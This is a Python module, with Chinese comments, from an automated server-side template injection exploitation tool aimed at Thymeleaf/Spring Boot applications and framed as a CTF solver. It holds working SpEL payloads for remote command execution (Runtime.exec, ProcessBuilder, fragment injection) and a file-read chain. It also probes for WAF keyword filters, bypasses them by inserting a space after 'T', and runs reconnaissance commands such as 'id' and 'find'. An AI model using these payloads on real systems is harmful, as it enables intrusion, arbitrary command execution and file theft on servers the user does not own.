"""
CTF 解题工具 — Thymeleaf 引擎模块
用途: 面向 CTF 竞赛的 Thymeleaf (Java/Spring Boot) SSTI 自动化解题辅助
场景: 竞赛平台题目 / 授权测试靶场

特点:
  - __${expression}__ 预处理语法是 Thymeleaf 独有的 SSTI 入口
  - 底层使用 SpEL (Spring Expression Language)
  - T(java.lang.Runtime).getRuntime().exec() 是经典 RCE 链
  - fragment 注入是 Spring View Manipulation 的常见场景
  - T 与 ( 之间插入空格可绕过正则过滤
"""

from .base import BaseEngine
from .utils import is_waf_blocked


BYPASS_STRATEGIES = [
    {
        'name': '无过滤（SpEL T() 调用）',
        'filters': set(),
        'rce': '__${T(java.lang.Runtime).getRuntime().exec("CMD")}__',
        'file_read': '__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("cat FILEPATH").getInputStream()).next()}__',
    },
    {
        'name': '过滤 T() 关键字（空格绕过）',
        'filters': {'keyword'},
        'rce': 'thymeleaf_space_bypass',
        'file_read': None,
    },
]


class ThymeleafEngine(BaseEngine):
    """Thymeleaf (Java/Spring Boot) SSTI 引擎"""

    name = 'thymeleaf'
    template_tags = ('__${', '}__', 'th:', '#{')
    error_keywords = [
        'SpelEvaluationException', 'ExpressionException',
        'TemplateProcessingException', 'Internal Server Error',
        'org.springframework.expression', 'org.thymeleaf',
        'EL1057', 'EL1007',
    ]

    detect_payloads = [
        {'payload': '__${7*7}__', 'expected': '49', 'engines': ['thymeleaf']},
        {'payload': '#{7*7}', 'expected': '49', 'engines': ['thymeleaf']},
    ]

    fingerprints = [
        {"payload": "__${7*7}__", "expected": "49", "desc": "Thymeleaf 预处理表达式"},
        {"payload": "#{7*7}", "expected": "49", "desc": "Thymeleaf 消息表达式"},
    ]

    rce_chains = [
        '__${T(java.lang.Runtime).getRuntime().exec("CMD")}__',
        '__${T(java.lang.ProcessBuilder).getDeclaredConstructors()[0].newInstance(new String[]{"CMD"}).start()}__',
        # fragment 注入方式
        'fragment=__${T(java.lang.Runtime).getRuntime().exec("CMD")}__',
    ]

    file_read_chains = [
        '__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("cat FILEPATH").getInputStream()).next()}__',
    ]

    bypass_strategies = BYPASS_STRATEGIES

    def probe_waf(self, toolkit):
        """Thymeleaf WAF 探测"""
        filters = set()
        filtered_keywords = set()

        t = toolkit.send_and_clean('__${7*7}__')
        if '49' not in t:
            return filters, filtered_keywords

        # 空格
        t = toolkit.send_and_clean('__${7 * 7}__')
        if '49' not in t:
            filters.add('space')

        # 关键字探测
        for kw in ['Runtime', 'ProcessBuilder', 'exec', 'getRuntime', 'Scanner']:
            if kw == 'Runtime':
                payload = '__${T(java.lang.Runtime)}__'
            elif kw == 'exec':
                payload = '__${T(java.lang.Runtime).getRuntime().exec("id")}__'
            elif kw == 'Scanner':
                payload = '__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__'
            else:
                continue
            t = toolkit.send_and_clean(payload)
            if is_waf_blocked(t):
                filtered_keywords.add(kw)

        if filtered_keywords:
            filters.add('keyword')

        self.waf_filters = filters
        self.filtered_keywords = filtered_keywords
        return filters, filtered_keywords

    def build_rce_payload(self, cmd, toolkit=None):
        """Thymeleaf RCE payload 构造"""
        strategy = getattr(toolkit, 'working_bypass', None) if toolkit else None

        if strategy and strategy['rce'] == 'thymeleaf_space_bypass':
            # T 与 ( 之间插入空格绕过正则
            if 'Runtime' in self.filtered_keywords or 'exec' in self.filtered_keywords:
                payload = f'__${{T (java.lang.Runtime).getRuntime().exec(new String[]{{"CMD"}})}}__'
                return payload.replace('CMD', cmd), None
            # ProcessBuilder 替代
            if 'ProcessBuilder' not in self.filtered_keywords:
                payload = f'__${{new java.lang.ProcessBuilder(new String[]{{"CMD"}}).start()}}__'
                return payload.replace('CMD', cmd), None
            return None, None

        if strategy and isinstance(strategy['rce'], str) and 'CMD' in strategy['rce']:
            return strategy['rce'].replace('CMD', cmd), None

        for chain in self.rce_chains:
            return chain.replace('CMD', cmd), None
        return None, None

    def build_file_payload(self, filepath, toolkit=None):
        """Thymeleaf 文件读取 payload"""
        # Scanner + exec cat
        payload = '__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("cat FILEPATH").getInputStream()).next()}__'
        return payload.replace('FILEPATH', filepath), None

    def is_rce_output(self, text, cmd, toolkit=None):
        if not text or len(text) < 2:
            return False
        if is_waf_blocked(text):
            return False
        if '__$' in text or 'th:' in text:
            return False
        for kw in self.error_keywords:
            if kw in text:
                return False
        if cmd == 'id':
            return 'uid=' in text or 'gid=' in text
        return len(text) > 0

    def info_gathering(self, toolkit):
        """Thymeleaf 信息收集"""
        print("\n" + "=" * 60)
        print("[*] 信息收集 (Thymeleaf)")
        print("=" * 60)

        # Spring 环境信息
        text = toolkit.send_and_clean('__${T(java.lang.System).getProperty("os.name")}__')
        if text and not is_waf_blocked(text):
            print(f"  操作系统: {text}")

        text = toolkit.send_and_clean('__${T(java.lang.System).getProperty("java.version")}__')
        if text and not is_waf_blocked(text):
            print(f"  Java 版本: {text}")

        if toolkit.working_chain:
            print("\n  [1] 系统信息 (通过 RCE):")
            output = toolkit.exec_cmd('id')
            if output:
                print(f"      {output[:300]}")

            print("\n  [2] 寻找 flag 文件:")
            output = toolkit.exec_cmd('find / -name "flag*" -type f 2>/dev/null | head -20')
            if output:
                print(f"      {output[:500]}")
            output = toolkit.exec_cmd('cat /flag 2>/dev/null; cat /flag.txt 2>/dev/null')
            if output:
                print(f"      [+] flag: {output}")
